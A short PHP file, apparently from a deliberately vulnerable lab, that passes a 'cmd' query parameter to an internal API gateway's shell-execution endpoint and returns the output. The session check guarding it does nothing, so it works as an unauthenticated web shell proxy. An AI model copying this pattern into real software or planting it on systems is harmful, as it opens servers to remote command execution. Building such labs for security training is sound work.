<?php
session_start();

// Check if user is authenticated (relaxed check since this is accessed via RCE)
// In a real scenario, this would be more restricted
if (!isset($_SESSION['user'])) {
    // In a real exploitation, the webapp wouldn't log its own compromise
    // This is intentionally minimal to be realistic
}

// Get command from query parameter
$command = $_GET['cmd'] ?? null;

// API Gateway shell endpoint
$api_gateway_shell_url = $_ENV['API_GATEWAY_SHELL_URL'] ?? 'http://api_gateway:8080/shell/exec';

try {
    // Prepare URL with command parameter
    $shell_url = $api_gateway_shell_url;
    if ($command) {
        $shell_url .= '?cmd=' . urlencode($command);
    }
    
    // Create HTTP context for API Gateway request
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 30,
            'header' => [
                'User-Agent: WebApp-Shell-Proxy/1.0'
            ]
        ]
    ]);
    
    // Forward request to API Gateway shell endpoint
    $shell_response = file_get_contents($shell_url, false, $context);
    
    if ($shell_response === false) {
        throw new Exception('Failed to contact API Gateway shell endpoint');
    }
    
    // Set content type and return response
    header('Content-Type: application/json');
    echo $shell_response;
    
} catch (Exception $e) {
    http_response_code(502);
    header('Content-Type: application/json');
    echo json_encode([
        'error' => 'Shell proxy failed',
        'message' => 'Failed to contact internal shell: ' . $e->getMessage(),
        'command' => $command
    ]);
}
?>